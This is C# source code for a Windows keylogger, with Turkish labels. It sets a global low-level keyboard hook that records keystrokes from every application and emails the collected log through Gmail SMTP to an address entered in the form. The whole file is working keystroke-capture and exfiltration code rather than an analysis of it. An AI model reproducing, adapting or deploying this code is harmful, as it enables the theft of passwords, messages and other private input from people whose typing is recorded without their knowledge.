using System;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static StringBuilder tuslariTut = new StringBuilder();
        private static Form1 formInstance;

        public Form1()
        {
            InitializeComponent();
            formInstance = this;
            _hookID = SetHook(_proc);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            lblDurum.Text = "Klavye dinleniyor... Enter'a basınca mail gönderilecek.";
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.Enter)
                {
                    formInstance.Invoke(new Action(() =>
                    {
                        formInstance.MailGonder();
                    }));
                }
                else
                {
                    string tusMetni = TusuMetneYevir(key);
                    tuslariTut.Append(tusMetni);

                    formInstance.Invoke(new Action(() =>
                    {
                        formInstance.txtTuslar.Text = tuslariTut.ToString();
                    }));
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string TusuMetneYevir(Keys key)
        {
            switch (key)
            {
                case Keys.Space:
                    return " ";
                case Keys.Back:
                    if (tuslariTut.Length > 0)
                        tuslariTut.Remove(tuslariTut.Length - 1, 1);
                    return "";
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Control:
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.Alt:
                case Keys.LMenu:
                case Keys.RMenu:
                    return "";
                default:
                    return key.ToString();
            }
        }

        private void MailGonder()
        {
            if (string.IsNullOrEmpty(tuslariTut.ToString()))
            {
                MessageBox.Show("Gönderilecek içerik yok!", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            try
            {
                string gonderenMail = txtGonderenMail.Text;
                string gonderenSifre = txtGonderenSifre.Text;
                string aliciMail = txtAliciMail.Text;

                if (string.IsNullOrEmpty(gonderenMail) || string.IsNullOrEmpty(gonderenSifre) || string.IsNullOrEmpty(aliciMail))
                {
                    MessageBox.Show("Lütfen tüm mail bilgilerini doldurun!", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress(gonderenMail);
                mail.To.Add(aliciMail);
                mail.Subject = "Klavye Kayıtları - " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                mail.Body = "Kaydedilen tuşlar:\n\n" + tuslariTut.ToString();

                smtpServer.Port = 587;
                smtpServer.Credentials = new NetworkCredential(gonderenMail, gonderenSifre);
                smtpServer.EnableSsl = true;

                smtpServer.Send(mail);

                MessageBox.Show("Mail başarıyla gönderildi!", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);

                tuslariTut.Clear();
                txtTuslar.Clear();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Mail gönderilirken hata oluştu: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
            base.OnFormClosing(e);
        }

        private void btnManuelGonder_Click(object sender, EventArgs e)
        {
            MailGonder();
        }

        private void btnTemizle_Click(object sender, EventArgs e)
        {
            tuslariTut.Clear();
            txtTuslar.Clear();
        }
    }
}